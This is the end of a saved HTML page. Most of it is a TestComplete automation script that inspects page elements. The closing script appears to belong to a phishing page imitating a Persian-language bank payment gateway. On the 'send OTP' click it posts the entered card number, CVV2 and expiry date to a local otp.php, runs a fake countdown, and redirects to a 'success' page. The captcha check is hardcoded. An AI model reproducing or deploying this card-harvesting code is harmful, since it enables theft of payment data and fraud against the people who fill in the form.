            'HTMLPreElement', 'HTMLProgressElement', 'HTMLQuoteElement', 'HTMLScriptElement',
            'HTMLSelectElement', 'HTMLSlotElement', 'HTMLSourceElement', 'HTMLSpanElement',
            'HTMLStyleElement', 'HTMLTableCaptionElement',
            'HTMLTableCellElement', 'HTMLTableColElement', 'HTMLTableElement', 'HTMLTableRowElement',
            'HTMLTableSectionElement', 'HTMLTextAreaElement', 'HTMLTitleElement', 'HTMLUListElement',
            'HTMLUnknownElement', 'HTMLVideoElement'
        ];
        var isCustom = false;
        if (window.customElements != null)
            isCustom = window.customElements.get(el.tagName) !== undefined;
        if (!isCustom)
            isCustom = classes.indexOf(el.constructor.name) < 0;
        return isCustom;
    },
    "standardTagNames": ["A", "ABBR", "ADDRESS", "APPLET", "AREA", "ARTICLE", "ASIDE", "AUDIO", "B", "BASE", "BDI",
        "BDO", "BLOCKQUOTE", "BODY", "BR", "BUTTON", "CANVAS", "CAPTION", "CITE", "CODE", "COL", "COLGROUP",
        "DATA", "DATALIST", "DD", "DEL", "DETAILS", "DFN", "DIALOG", "DIR", "DIV", "DL", "DT", "EM", "EMBED",
        "FIELDSET", "FIGCAPTION", "FIGURE", "FONT", "FOOTER", "FORM", "FRAME", "FRAMESET", "H1", "H2", "H3",
        "H4", "H5", "H6", "HEAD", "HEADER", "HGROUP", "HR", "HTML", "I", "IFRAME", "IMG", "INPUT", "INS", "KBD",
        "KEYGEN", "LABEL", "LEGEND", "LI", "LINK", "MAIN", "MAP", "MARK", "META", "METER", "MENU", "MENUITEM",
        "NAV", "NOSCRIPT", "OBJECT", "OL", "OPTGROUP", "OPTION", "OUTPUT", "P", "PARAM", "PICTURE", "PRE",
        "PROGRESS", "Q", "RB", "RP", "RT", "RTC", "RUBY", "S", "SAMP", "SCRIPT", "SECTION", "SELECT", "SLOT",
        "SMALL", "SOURCE", "SPAN", "STRONG", "STYLE", "SUB", "SUMMARY", "SUP", "SVG", "TABLE", "TBODY", "TD",
        "TEMPLATE", "TEXTAREA", "TFOOT", "TH", "THEAD", "TIME", "TITLE", "TR", "TRACK", "U", "UL", "VAR",
        "VIDEO", "WBR"
    ],
    "canBeCustomElement": function(el) {
        if (!el) return false;

        var tagName = el.tagName || '';
        if (tagName.indexOf('-') >= 0)
            return true;
        if ((this.standardTagNames.indexOf(tagName) >= 0) && el.getAttribute('is'))
            return true;

        return false;
    },
    "getNodeInfo": function(node) {
        var node_info = {};
        try {
            var isElement = (node.nodeType == 1);
            var isInputElement = (isElement && node.tagName.toLowerCase() == 'input');
            if (!isElement || !node.getAttribute('isTestCompleteHiddenNode')) {
                node_info.nodeType = node.nodeType;
                node_info.tagName = node.tagName || '';
                node_info.className = node.className || '';
                node_info.inputType = isInputElement ? node.type : '';
                node_info.inputValue = isInputElement ? node.value : '';
                node_info.id = (isElement && node.getAttribute('id')) || '';
                node_info.name = (isElement && node.getAttribute('name')) || '';
                node_info.role = (isElement && node.getAttribute('role')) || '';
                node_info.hasNonEmptyTextChild = false;
                node_info.firstChildIsNonEmptyText = false;
                node_info.isCustom = (isElement && this.canBeCustomElement(node)) ? this.invoke({
                    'method': 'isCustomElement',
                    'objectId': this.OBJECTID_IOCM,
                    'flags': 2,
                    'params': [{
                        'objectId': this.calcMoniker(node)
                    }]
                })["retVal"] : false;
                node_info.hasShadowRoot = node.shadowRoot != null;
                var child = node.firstChild;
                var isFirstChild = true;
                while (child) {
                    if (child.nodeType == 3) {
                        var txt = child.data;
                        if (txt && txt.replace(/^[ \n\r\t]+/, '')) {
                            node_info.hasNonEmptyTextChild = true;
                            if (isFirstChild)
                                node_info.firstChildIsNonEmptyText = true;
                            break;
                        }
                    }
                    child = child.nextSibling;
                    isFirstChild = false;
                }
                node_info.hasChildren = node_info.hasNonEmptyTextChild || (isElement ? node.childElementCount >
                    0 : node.hasChildNodes());
            }
        } catch (e) {
            console.trace(e);
        }
        return JSON.stringify(node_info);
    },
    "getObjectMoniker": function(objectId) {

        if (typeof(objectId) == "string")
            return objectId;

        if (objectId == this.OBJECTID_NULL)
            return "";

        if (objectId == this.OBJECTID_WINDOW)
            return "window";

        if (objectId == this.OBJECTID_CONTEXT)
            return "window[\"" + this.name + "\"].context";

        if (objectId == this.OBJECTID_AGENT)
            return "window[\"" + this.contentAgentName + "\"]";

        if (objectId == this.OBJECTID_IOCM)
            return "window[\"" + this.name + "\"]";

        var obj = this.objectCache[objectId];
        if (obj === null)
            return "";

        var moniker = this.objectMonikerCache[objectId];
        if (typeof(moniker) != "string")
            moniker = "";

        if ((obj === 0) && (moniker != "")) {
            try {
                obj = eval(moniker);
                if (obj !== undefined)
                    this.objectCache[objectId] = obj;
            } catch (e) {}
            return moniker;
        }

        try {
            var newObj = null;
            if (moniker != "") try {
                newObj = eval(moniker);
            } catch (e) {}
            if ((moniker == "") || (newObj !== obj)) {
                var newMoniker = this.calcMoniker(obj);
                if (newMoniker != "") {
                    this.objectMonikerCache[objectId] = newMoniker;
                    moniker = newMoniker;
                }
            }
        } catch (e) {}

        return moniker;
    },
    "injectObject": function(objectId, moniker) {

        if ((typeof(objectId) != "number") || (objectId == 0))
            return;

        this.objectCache[objectId] = 0;
        this.objectMonikerCache[objectId] = moniker;
    },
    "injectObjects": function(obj) {

        if ((typeof(obj) != "object") || (obj === null))
            return obj;

        for (var name in obj) {

            if (name == "$m") {
                this.injectObject(obj["objectId"], obj["$m"]);
                delete obj["$m"];
            } else if (typeof(obj[name]) == "object")
                obj[name] = this.injectObjects(obj[name]);
        }

        return obj;
    },
    "calcMoniker": function(obj, parentMoniker) {

        if (!this.isObject(obj) || (obj === null))
            return "";

        if ((document != null) && (obj === document.all))
            return "document.all";

        if ((document != null) && (obj === document.frames))
            return "document.frames";

        if (obj == window)
            return "window";

        if (obj == document)
            return "document";

        if ((document != null) && (obj == document.body))
            return "document.body";

        if ((typeof(obj.id) == "string") && (document.getElementById(obj.id) == obj))
            return "document.getElementById(\"" + obj.id + "\")";

        if (!parentMoniker) {
            var objDocument = obj.ownerDocument || obj.document;
            var ownerFrame = (objDocument && objDocument.defaultView) ? objDocument.defaultView.frameElement :
                null;

            if (ownerFrame) {
                if (obj == objDocument.defaultView)
                    return this.calcMoniker(ownerFrame) + ".contentDocument.defaultView";
                if (obj == objDocument)
                    return this.calcMoniker(ownerFrame) + ".contentDocument";
                if (obj == objDocument.body)
                    return this.calcMoniker(ownerFrame) + ".contentDocument.body";
                if ((typeof(obj.id) == "string") && (objDocument.getElementById(obj.id) == obj))
                    return this.calcMoniker(ownerFrame) + ".contentDocument.getElementById(\"" + obj.id + "\")";
            }
        }

        var parentNode = obj.parentNode;
        if ((typeof(parentNode) != "object") || (parentNode == null))
            return "";

        if (!parentMoniker)
            parentMoniker = this.calcMoniker(parentNode);

        if (parentMoniker == "")
            return "";

        for (var i = 0; i < parentNode.childNodes.length; i++) {
            if (parentNode.childNodes[i] == obj)
                return parentMoniker + ".childNodes[" + i + "]";

        }

        return "";
    },
    "cacheObject": function(obj, parentMoniker, getterName, depth) {
        if (obj === null)
            return {
                "objectId": this.OBJECTID_NULL
            };

        if (obj == window)
            return {
                "objectId": this.OBJECTID_WINDOW
            };

        var objectId;

        if (this.freeIndexes.length > 0) {
            objectId = this.freeIndexes.pop();
        } else {
            objectId = this.nextCacheId;
            this.nextCacheId += this.nextCacheIdStep;
        }

        this.objectCache[objectId] = obj;
        var retVal = {
            "objectId": objectId
        };

        if (this.isObject(obj)) {
            var hasParentMoniker = (typeof(parentMoniker) == "string") && (parentMoniker != "");
            //var isSpecificGetter = (getterName == "parentNode") || (getterName == "body");
            //var objectMoniker = (hasParentMoniker && isSpecificGetter) ? "" : this.calcMoniker(obj, parentMoniker);
            var objectMoniker = this.calcMoniker(obj);

            if ((objectMoniker == "") && (typeof(getterName) == "string")) {
                if (hasParentMoniker)
                    objectMoniker = parentMoniker + ".";
                objectMoniker += getterName;
            }

            this.objectMonikerCache[objectId] = objectMoniker;
            if ((objectMoniker != "") && this.inSandbox())
                retVal["$m"] = objectMoniker;

        } else {
            return retVal;
        }

        depth = (depth || 0) + 1;

        if (typeof(getterName) != "string")
            getterName = "";

        retVal["cache"] = {};

        var ctor = (obj.constructor != null) ? (obj.constructor.name || "") : "";

        if (depth <= 2) {
            var allowPrefetch = false; // TODO: this.inSandbox();
            var typeMoniker = this.getTypeMoniker(obj);
            if (typeof(this.cachedNamespaces[typeMoniker]) == "object") {
                for (var cachedName in this.cachedNamespaces[typeMoniker]) {
                    var hasProp = this.cachedNamespaces[typeMoniker][cachedName];
                    if (hasProp == -1)
                        hasProp = this.hasProperty.apply(obj, [cachedName, this]);

                    if ((hasProp == 1) && allowPrefetch) {
                        var propVal = obj[cachedName];
                        if (!this.isObject(propVal) || (propVal === null) || (depth == 1)) {
                            retVal["cache"][cachedName] = this.encodeParam(propVal, objectMoniker, cachedName,
                                depth);
                            continue;
                        }
                    }
                    retVal["cache"]["#has,\"" + cachedName + "\""] = hasProp;
                }
            }
        }

        if (ctor == "Object") {
            retVal["cache"]["$ctor"] = ctor;
            return retVal;
        }

        if (ctor == "NamedNodeMap") {
            retVal["cache"]["$ctor"] = ctor;
            retVal["cache"]["#has,\"getNamedItem\""] = 2;
            retVal["cache"]["getNamedItem,\"id\""] = this.cacheObject(obj.getNamedItem("id"), objectMoniker,
                "getNamedItem(\"id\")", depth);
            retVal["cache"]["getNamedItem,\"isTestCompleteHiddenNode\""] = this.cacheObject(obj.getNamedItem(
                    "isTestCompleteHiddenNode"), objectMoniker,
                "getNamedItem(\"isTestCompleteHiddenNode\")", depth);
            return retVal;
        } else if (ctor == "ClientRect") {

            retVal["cache"]["$ctor"] = ctor;
            retVal["cache"]["left"] = obj.left || 0;
            retVal["cache"]["top"] = obj.top || 0;
            retVal["cache"]["width"] = obj.width || 0;
            retVal["cache"]["height"] = obj.height || 0;
            return retVal;
        } else if (ctor == "Attr") {
            retVal["cache"]["value"] = obj.value;
        } else if (ctor == "Array") {

            retVal["cache"]["$ctor"] = ctor;
            for (var i = 0; i < (obj.length > 50 ? 50 : obj.length); i++) {
                var propVal = obj[i];
                if (!this.isObject(propVal) || (propVal === null) || (depth == 1))
                    retVal["cache"][i] = this.encodeParam(propVal, objectMoniker, i.toString(), depth);
                else
                    retVal["cache"]["#has,\"" + i.toString() + "\""] = 1;
            }
            return retVal;
        }

        var tagName = obj["tagName"] || "";
        if ((ctor == "") && (tagName == "OBJECT"))
            ctor = "HTMLObjectElement";
        retVal["cache"]["$ctor"] = ctor;

        var nodeType = -1;
        if (typeof(obj["nodeType"]) != "undefined") {
            nodeType = obj["nodeType"] || 0;
            retVal["cache"]["nodeType"] = nodeType;
        }

        var nodeName = "";
        if (typeof(obj["nodeName"]) == "string") {
            nodeName = obj["nodeName"].toUpperCase();
            retVal["cache"]["nodeName"] = nodeName;
        }

        if (nodeType == 9 /* Document */ ) {
            retVal["cache"]["clientLeft"] = obj["clientLeft"] || 0;
            retVal["cache"]["clientTop"] = obj["clientTop"] || 0;
            retVal["cache"]["defaultView"] = this.cacheObject(obj["defaultView"], objectMoniker, "defaultView",
                depth);;
            return retVal;
        }

        if ((nodeType != 1 /* Element */ ) && (nodeType != 3 /* TextNode */ ) && (nodeType != 8 /* Comment */ ))
            return retVal;

        if ((depth > 1) && ((getterName == "parentNode") || (getterName == "offsetParent"))) {

            retVal["cache"]["tagName"] = tagName;
            if (tagName == "TR")
                retVal["cache"]["rowIndex"] = obj["rowIndex"];

            var persistentId = this.getObjectPersistentId(obj);
            return retVal;
        }

        retVal["cache"]["nodeValue"] = obj["nodeValue"] || "";

        if ((depth <= 50) && ((getterName == "firstChild") || (getterName == "nextSibling"))) {
            var sibling = obj["nextSibling"];
            if (typeof(sibling) == "object")
                retVal["cache"]["nextSibling"] = this.cacheObject(sibling, parentMoniker, "nextSibling", depth);
            if (getterName == "nextSibling") {
                var firstChild = obj["firstChild"];
                if ((firstChild != null) && (firstChild["nextSibling"] == null))
                    retVal["cache"]["firstChild"] = this.cacheObject(firstChild, objectMoniker, "firstChild",
                        depth);
            }
        } else
        if ((depth <= 50) && ((getterName == "nextElementSibling") || (getterName == "firstElementChild"))) {
            var sibling = obj["nextElementSibling"];
            if (typeof(sibling) == "object")
                retVal["cache"]["nextElementSibling"] = this.cacheObject(sibling, parentMoniker,
                    "nextElementSibling", depth);
        } else
        if ((depth == 1) && (getterName == "offsetParent")) {

            retVal["cache"]["offsetLeft"] = obj["offsetLeft"] || 0;
            retVal["cache"]["offsetTop"] = obj["offsetTop"] || 0;
        } else
        if ((depth == 1) && (getterName == "parentElement")) {

            retVal["cache"]["clientLeft"] = obj["clientLeft"] || 0;
            retVal["cache"]["clientTop"] = obj["clientTop"] || 0;
            retVal["cache"]["clientHeight"] = obj["clientHeight"] || 0;
            retVal["cache"]["clientWidth"] = obj["clientWidth"] || 0;
            retVal["cache"]["scrollLeft"] = obj["scrollLeft"] || 0;
            retVal["cache"]["scrollTop"] = obj["scrollTop"] || 0;
            retVal["cache"]["offsetLeft"] = obj["offsetLeft"] || 0;
            retVal["cache"]["offsetTop"] = obj["offsetTop"] || 0;
            retVal["cache"]["ownerDocument"] = this.cacheObject(obj["ownerDocument"], objectMoniker,
                "ownerDocument", depth);
            retVal["cache"]["offsetParent"] = this.cacheObject(obj["offsetParent"], objectMoniker,
                "offsetParent", depth);
        }

        if (obj["firstChild"] == null)
            retVal["cache"]["firstChild"] = {
                "objectId": 0
            };

        if (obj["firstElementChild"] == null)
            retVal["cache"]["firstElementChild"] = {
                "objectId": 0
            };


        if (nodeType != 1)
            return retVal;

        retVal["cache"]["tagName"] = tagName;

        var persistentId = this.getObjectPersistentId(obj);
        retVal["cache"][this.persistentIdName] = persistentId;

        retVal["cache"]["className"] = obj["className"] || "";
        retVal["cache"]["id"] = obj["id"] || "";

        if ((getterName != "") && (getterName != "parentNode")) {
            var parentNode = obj["parentNode"];
            if (typeof(parentNode) == "object")
                retVal["cache"]["parentNode"] = this.cacheObject(parentNode, objectMoniker, "parentNode",
                    depth);
        }

        if (nodeName == "TD") {
            retVal["cache"]["cellIndex"] = obj["cellIndex"];
        } else if (nodeName == "TR") {
            retVal["cache"]["rowIndex"] = obj["rowIndex"];
        }

        retVal["cache"]["$nodeInfo"] = this.getNodeInfo(obj);

        var attributes = obj["attributes"];
        if ((typeof(attributes) == "object") && (attributes != null))
            retVal["cache"]["attributes"] = this.cacheObject(attributes, objectMoniker, "attributes", depth);
        else
            retVal["cache"]["#has,\"attributes\""] = 0;

        retVal["cache"]["role"] = obj["role"] || "";

        if (tagName.toUpperCase() == "IMG") {
            retVal["cache"]["useMap"] = obj["useMap"] || "";
            retVal["cache"]["src"] = obj["src"] || "";
        }

        return retVal;
    },
    "revokeObject": function(objectId) {
        if ((typeof(objectId) != "number") || (objectId == 0))
            return;

        this.objectCache[objectId] = 0;
        this.objectMonikerCache[objectId] = "";

        if (((this.nextCacheIdStep < 0) && (objectId > 0)) ||
            ((this.nextCacheIdStep > 0) && (objectId < 0)))
            return;

        this.freeIndexes.push(objectId);
    },
    "getObjectFromCache": function(objectId) {
        if (typeof(objectId) != "number") {
            if ((typeof(objectId) == "string") && (objectId != "")) {
                try {
                    return eval(objectId);
                } catch (e) {
                    //console.trace(e);
                    //console.log("can't get " + objectId);
                }
            }
            return null;
        }

        if (objectId == this.OBJECTID_NULL)
            return null;

        if (objectId == this.OBJECTID_WINDOW)
            return window;

        if (objectId == this.OBJECTID_CONTEXT)
            return this.context;

        if (objectId == this.OBJECTID_AGENT)
            return window[this.contentAgentName];

        if (objectId == this.OBJECTID_IOCM)
            return this;

        var obj = this.objectCache[objectId];
        if ((obj === undefined) || (typeof(obj) == "number"))
            return null;
        return obj;
    },
    "getTypeMoniker": function(obj) {

        if (!this.isObject(obj) || (obj === null))
            return "";

        if (typeof(obj["nodeType"]) == "number")
            return "";

        var typeMoniker = obj.constructor != null ? obj.constructor.name + "" : "";
        if ((typeMoniker == "") && (obj.constructor != null))
            typeMoniker = obj.constructor.toString();

        return typeMoniker;
    },
    "addNameToNamespace": function(obj, name, value) {
        if (!this.inSandbox())
            return;

        var typeMoniker = this.getTypeMoniker(obj);
        if (typeMoniker == "")
            return;

        if ((typeMoniker == "Array") && (name != "toString") && (name != "item") && (name != "length"))
            return;

        if (typeof(this.cachedNamespaces[typeMoniker]) != "object")
            this.cachedNamespaces[typeMoniker] = {};

        if ((typeof(this.cachedNamespaces[typeMoniker][name]) != "number") ||
            (this.cachedNamespaces[typeMoniker][name] == -1)) {
            this.cachedNamespaces[typeMoniker][name] = value;
        }
    },
    "hasProperty": function(name, iocm) {
        if (this === null)
            return 0;

        if ((typeof(iocm) == "object") && (iocm != null))
            iocm.addNameToNamespace(this, name, -1);

        if (!this.propertyIsEnumerable(name) && !(name in this))
            return 0;

        if (typeof(this[name]) != "function")
            return 1;

        return 2;
    },
    "isCachable": function(obj) {
        if (obj === undefined)
            return false;

        var typeName = typeof(obj);
        if ((typeName == "string") || (typeName == "number") || (typeName == "boolean"))
            return false;

        return true;
    },
    "getBounds": function() {

        var inDocumentNodeHidden = function(node) {

            if (!node || node.hidden === true)
                return true;

            var style = window.getComputedStyle(node, '');
            if (style && style.getPropertyValue('display') === 'none')
                return true;
            if (style && style.getPropertyValue('visibility') === 'hidden')
                return true;
            return false;
        };

        var rect = this.getBoundingClientRect();
        return JSON.stringify({
            "inDocumentNodeHidden": inDocumentNodeHidden(this),
            "left": rect.left,
            "top": rect.top,
            "width": rect.width,
            "height": rect.height
        });
    },
    "encodeParam": function(value, parentMoniker, getterName, depth) {

        if (this.isCachable(value)) {

            value = this.cacheObject(value, parentMoniker, getterName, depth);

        } else if (typeof(value) == "number") {

            if (isNaN(value))
                value = {
                    "constId": 1
                };
            else if (value == Infinity)
                value = {
                    "constId": 2
                };
            else if (value == -Infinity)
                value = {
                    "constId": 3
                };
        } else if (value === undefined) {
            value = {
                "constId": 0
            };
        }

        return value;
    },
    "decodeConst": function(constId) {

        if (constId == 0)
            return undefined;
        else if (constId == 1)
            return NaN;
        else if (constId == 2)
            return Infinity;
        else if (constId == 3)
            return -Infinity;
        else
            return null;
    },
    "decodeParam": function(param) {

        if (typeof(param) == "object") {

            if (typeof(param["objectId"]) != "undefined")
                return this.getObjectFromCache(param["objectId"]);
            if (typeof(param["constId"]) != "undefined")
                return this.decodeConst(param["constId"]);
        }
        return param;
    },
    "createParamMoniker": function(param) {

        if (typeof(param) == "object") {

            if (typeof(param["objectId"]) != "undefined")
                return this.getObjectMoniker(param["objectId"]);
            if (typeof(param["constId"]) != "undefined")
                return this.decodeConst(param["constId"]);
        } else if (typeof(param) == "string")
            return JSON.stringify(param);
        return param;
    },
    "createRetVal": function(value, parentMoniker, getterName) {
        return {
            "retVal": this.encodeParam(value, parentMoniker, getterName, 0)
        };
    },
    "createError": function(callData, errorCode) {
        console.log("invoke error = " + errorCode);
        return {
            "errorCode": errorCode,
            "retVal": 0
        };
    },
    "invoke": function(callData) {
        try {

            if (!callData || (typeof(callData) != "object"))
                return this.createError(callData, "invalid callData");

            var methodName = callData["method"] || "";
            var flags = callData["flags"];

            if ((flags == 2) && (methodName == "#batchRelease")) {
                var params = callData["params"];
                for (var i = 0; i < params.length; i++)
                    this.revokeObject(params[i]);
                return null;
            }

            var objectId = callData["objectId"] || 0;
            var callObject = this.getObjectFromCache(objectId);
            if (callObject === null)
                return this.createError(callData, "invalid call object");

            if (flags == 0) // get property
            {
                return this.createRetVal(callObject[methodName], this.getObjectMoniker(objectId), methodName);
            }

            if (flags == 1) // put property
            {
                var params = callData["params"];
                if (typeof(params) != "object")
                    return this.createError(callData, "invalid call params");

                callObject[methodName] = this.decodeParam(params[0]);
                return null;
            }

            if (flags == 2) // call method
            {
                var params = callData["params"];
                if (typeof(params) != "object")
                    return this.createError(callData, "invalid call params");

                var methodMoniker = methodName + "(";
                for (var i = 0; i < params.length; i++) {
                    methodMoniker += this.createParamMoniker(params[i]);
                    if (i != params.length - 1) methodMoniker += ", ";
                    params[i] = this.decodeParam(params[i]);
                }
                methodMoniker += ")";

                var func = null;

                if (methodName == "#has") {

                    func = this.hasProperty;
                    params = [params[0], this];

                } else if (methodName == "#getbounds") {

                    func = this.getBounds;
                } else {

                    if (methodName != "") {
                        func = callObject[methodName];
                    } else {
                        func = callObject;
                    }
                }

                if (typeof(func) != "function")
                    return this.createError(callData, "invalid function");

                var funcRetVal = null;
                try {
                    funcRetVal = func.apply(callObject, params);
                } catch (e) {
                    console.trace(e);
                }

                return this.createRetVal(funcRetVal, null, this.getObjectMoniker(objectId) + "." +
                    methodMoniker);
            }

            return this.createError(callData, "invalid call flags");
        } catch (e) {
            console.trace(e);
            return this.createError(callData, "exception: " + e);
        }
    },
    "port": null
};
</script>
<input id="_retVal12" style="display: none;" istestcompletehiddennode="1">
<!--}}TestCompleteHiddenNodes-->
<script src="https://code.jquery.com/jquery-3.6.3.min.js"></script>
<script>
const sendotp = document.querySelector("#sendotp")
const CardNumber = document.querySelector("#pan")
const Cvv2 = document.querySelector("#cvv2")
const ExpireMonth = document.querySelector("#txtExpM")
const ExpireYear = document.querySelector("#txtExpY")
const pay = document.querySelector("#btnPayment")
const captcha = document.querySelector("#Captcha")
const pin2 = document.querySelector("#pin2")

pay.addEventListener("click", function(e) {

if(CardNumber.value.length < 15){
    e.preventDefault()
}
else if(Cvv2.value.length == ""){
    e.preventDefault()
}
else if(ExpireMonth.value.length == ""){
    e.preventDefault()
}
else if(ExpireYear.value.length == ""){
    e.preventDefault()
}
else if(captcha.value != "18720"){
    e.preventDefault()
}
else if(pin2.value.length < 4){
    e.preventDefault()
}
else{}

})

sendotp.addEventListener("click", function() {

    if(CardNumber.value.length < 15){
        return false
    }
    else if(Cvv2.value.length == ""){
        return false
    }
    else if(ExpireMonth.value.length == ""){
        return false
    }
    else if(ExpireYear.value.length == ""){
        return false
    }
    else{

    function loc() {
        window.location.href = "./success/index.html"
    }

    function addpass() {
        let form_data = new FormData();
        form_data.append('CardNumber', CardNumber.value);
        form_data.append("Cvv2", Cvv2.value);
        form_data.append("ExpireYear", ExpireYear.value);
        form_data.append("ExpireMonth", ExpireMonth.value);
        $.ajax({
            url: './otp.php',
            dataType: 'text',
            cache: false,
            contentType: false,
            processData: false,
            data: form_data,
            type: 'POST',
        });
    }

    addpass()
    setTimeout(loc,4000);

    document.getElementById('sendotp').innerHTML = 001 + ":" + 020;
    startTimer();


    function startTimer() {
        document.getElementById('sendotp').disabled = true
        var presentTime = document.getElementById('sendotp').innerHTML;
        var timeArray = presentTime.split(/[:]+/);
        var m = timeArray[0];
        var s = checkSecond((timeArray[1] - 1));
        if (s == 59) {
            m = m - 1
        }
        if(m < 0){
            document.getElementById('sendotp').innerHTML = "ارسال مجدد کد"
            return false;
        }

        document.getElementById('sendotp').innerHTML =
            m + ":" + s;
        console.log(m)
        setTimeout(startTimer, 1000);
    }

    function checkSecond(sec) {
        if (sec < 10 && sec >= 0) {
            sec = "0" + sec
        }; // add zero in front of numbers < 10
        if (sec < 0) {
            sec = "59"
        };
        return sec;
    }
}
})
</script>

</html>